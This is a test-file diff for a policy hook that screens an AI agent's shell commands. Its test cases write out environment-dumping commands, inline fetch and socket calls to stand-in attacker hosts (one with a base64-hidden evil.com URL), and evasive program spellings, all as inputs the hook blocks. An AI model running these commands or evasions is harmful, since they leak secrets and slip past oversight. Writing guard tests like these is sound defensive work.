@@ -496,3 +496,172 @@ describe("factory policy: review:wait runs in the foreground (#129)", () => {
     expect(decide(call(false), env)).toEqual({ kind: "allow" });
   });
 });
+
+describe("factory policy: the whole environment and network calls from code (#243)", () => {
+  it.each([
+    "node -p process.env",
+    "node -e 'console.log(JSON.stringify(process.env))'",
+    "node -e 'for (const k in process.env) console.log(k)'",
+    "node -e \"console.log(process['env'])\"",
+    "node -e 'console.log(Object.entries(process.env))'",
+    "env -0",
+    "env --null | tr '\0' '\n'",
+    "printenv",
+    "printenv HOME",
+    "python3 -c 'import os; print(os.environ)'",
+    "python -c 'import os; print(dict(os.environ))'",
+    "python3 -c 'from os import environ; print(environ)'",
+  ])("blocks reading the environment: %s", (command) => {
+    expect(commandViolations(command)).not.toEqual([]);
+  });
+
+  it.each([
+    "node -e \"fetch('https://attacker.example/x', { method: 'POST', body: '1' })\"",
+    "node -e 'fetch(process.argv[1])' https://attacker.example",
+    'node -e "fetch(url)"',
+    "node -e \"require('https').request('https://attacker.example').end()\"",
+    "node -e \"require('node:http').get('http://attacker.example')\"",
+    "node --input-type=module -e \"import https from 'node:https'; https.get('https://x.example')\"",
+    "python3 -c 'import urllib.request; urllib.request.urlopen(\"https://x.example\")'",
+    "python3 -c 'import requests; requests.post(\"https://x.example\", data=1)'",
+    "python3 -c 'import socket; socket.create_connection((\"x.example\", 443))'",
+  ])("blocks a network call from code: %s", (command) => {
+    expect(commandViolations(command)).toContainEqual(expect.stringMatching(/only reach the app on localhost/));
+  });
+
+  it.each([
+    "node -e 'console.log(process.env.FAULTFORGE_TICKET_FILE)'",
+    "node -e \"fetch('http://localhost:3000/health').then((r) => console.log(r.status))\"",
+    "node -e \"require('http').get('http://127.0.0.1:3000/bookings', (r) => console.log(r.statusCode))\"",
+    "env PORT=3000 npx tsx src/server.ts",
+    "git fetch origin main",
+    "npm run review:wait -- target 19 --commit abc1234 --timeout 9",
+    "gh pr create --repo AJBeumer/faultforge --title 'Filter bookings' --body-file pr.md",
+  ])("still allows %s", (command) => {
+    expect(commandViolations(command)).toEqual([]);
+  });
+
+  it("denies them through the hook itself, inside a run", () => {
+    for (const command of ["node -p process.env", "env -0", "python3 -c 'import os; print(os.environ)'"]) {
+      const decision = decide(JSON.stringify({ tool_name: "Bash", tool_input: { command } }), {
+        FAULTFORGE_FACTORY_RUN: "r",
+        FAULTFORGE_RUN_ROOT: RUN,
+      });
+      expect(decision.kind).toBe("deny");
+    }
+  });
+});
+
+describe("factory policy: decides in linear time (AUD-M4, lead's follow-up to PR 265)", () => {
+  const crafted = {
+    "git then push, over and over": "git push x ".repeat(600),
+    "git words, then a push with a branch at the end": `${"git ".repeat(1500)}push origin ${"a".repeat(30)}`,
+    "push, then branch-like words with colons": `git push ${"a:b".repeat(2000)}`,
+    "gh issue edit, over and over": "gh issue edit 5 ".repeat(400),
+    "gh api, over and over": "gh api x ".repeat(700),
+    "gh, then graphql far away": `${"gh ".repeat(2000)}graphql`,
+  };
+
+  it.each(Object.entries(crafted))("a crafted 6 KB command (%s) decides in under a second", (_name, command) => {
+    expect(command.length).toBeGreaterThan(5000);
+    const start = performance.now();
+    commandViolations(command, "18");
+    decide(JSON.stringify({ tool_name: "Bash", tool_input: { command } }), {
+      FAULTFORGE_FACTORY_RUN: "r",
+      FAULTFORGE_RUN_ROOT: RUN,
+      FAULTFORGE_TICKET_NUMBER: "18",
+    });
+    expect(performance.now() - start).toBeLessThan(1000);
+  });
+
+  it("still finds what the step rules looked for", () => {
+    expect(commandViolations("git -C repo push origin HEAD:main")).toContainEqual(
+      expect.stringMatching(/never push to main/),
+    );
+    expect(commandViolations('git push origin "HEAD":"refs/heads/main"')).toContainEqual(
+      expect.stringMatching(/never push to main/),
+    );
+    expect(commandViolations("(git push origin main)")).toContainEqual(expect.stringMatching(/never push to main/));
+    expect(commandViolations("git push --force-with-lease=x origin b")).toContainEqual(
+      expect.stringMatching(/no force push/),
+    );
+    expect(commandViolations("git push origin +b")).toContainEqual(expect.stringMatching(/no force push/));
+    expect(commandViolations("git push origin :b")).toContainEqual(expect.stringMatching(/no force push/));
+    expect(commandViolations("gh api -XPOST repos/o/r/labels")).toContainEqual(expect.stringMatching(/read-only/));
+    expect(commandViolations("gh api --method=PATCH repos/o/r")).toContainEqual(expect.stringMatching(/read-only/));
+    expect(commandViolations("gh issue edit 5 --repo o/r --add-label x")).toContainEqual(
+      expect.stringMatching(/sets the ticket's labels/),
+    );
+    expect(commandViolations("gh api -X GET repos/o/r/pulls")).toEqual([]);
+    expect(commandViolations("git push origin feature-main-menu")).toEqual([]);
+    expect(commandViolations("git push origin my-branch; echo main")).toEqual([]);
+  });
+
+  it("refuses a command longer than it reads", () => {
+    expect(commandViolations("x".repeat(100_001))).toContainEqual(expect.stringMatching(/can't be checked/));
+  });
+});
+
+describe("factory policy: quoted separators, extra calls, Python imports (Qodo on PR 270)", () => {
+  it.each([
+    'gh api -X POST "repos/o/r/issues/1/comments;x" -f body=hi',
+    'gh issue edit 5 --title "a & b" --add-label x',
+    'git push "origin|x" --force',
+    'git commit -m "a; b" && git push origin "main"',
+    "$(git push origin main)",
+  ])("still sees the step through a quoted separator: %s", (command) => {
+    expect(commandViolations(command)).not.toEqual([]);
+  });
+
+  it.each([
+    "node -e \"fetch('http://localhost:1');fetch(atob('aHR0cHM6Ly9ldmlsLmNvbQ=='))\"",
+    "python3 -c 'from requests import get; get(\"https://x.example\")'",
+    "python3 -c 'from socket import create_connection as c; c((\"x.example\", 443))'",
+    "python3 -c 'from urllib.request import urlopen; urlopen(u)'",
+  ])("refuses a network call no local URL vouches for: %s", (command) => {
+    expect(commandViolations(command)).toContainEqual(expect.stringMatching(/only reach the app on localhost/));
+  });
+
+  it("still allows one local call per local URL", () => {
+    expect(
+      commandViolations("node -e \"fetch('http://localhost:3000/a').then(() => fetch('http://127.0.0.1:3000/b'))\""),
+    ).toEqual([]);
+  });
+});
+
+describe("factory policy: other spellings of the program and of the environment (Qodo on PR 270, round 2)", () => {
+  it.each([
+    "/usr/bin/git push --force origin x",
+    "\\git push --force origin x",
+    "git.exe push origin main",
+    "$(command -v git) push --force origin x",
+    '"C:/Program Files/Git/cmd/git.exe" push origin main',
+    "/usr/bin/gh api -X POST repos/o/r/labels",
+  ])("sees the program however it is written: %s", (command) => {
+    expect(commandViolations(command)).not.toEqual([]);
+  });
+
+  it.each([
+    'node -e "const {env}=process;console.log(env)"',
+    "node -e \"console.log(require('process').env)\"",
+    "node -e \"console.log(Reflect.get(process,'env'))\"",
+    "python -c 'import os as o;print(o.environ)'",
+  ])("refuses a whole-environment read under another spelling: %s", (command) => {
+    expect(commandViolations(command)).toContainEqual(expect.stringMatching(/environment/));
+  });
+});
+
+describe("factory policy: compact flags, other env programs, /proc, JS clients (Qodo on PR 270, round 3)", () => {
+  it.each([
+    "gh api repos/o/r/pulls/1/reviews -fbody=hi -fevent=COMMENT",
+    "/usr/bin/env",
+    "bash -c 'env'",
+    'sh -c "env"',
+    "node -e \"require('child_process').execSync('env')\"",
+    "cat /proc/1234/envir?n",
+    "cat /proc/self/cmdline",
+    "node -e \"require('axios').get(u)\"",
+  ])("refuses %s", (command) => {
+    expect(commandViolations(command)).not.toEqual([]);
+  });
+});
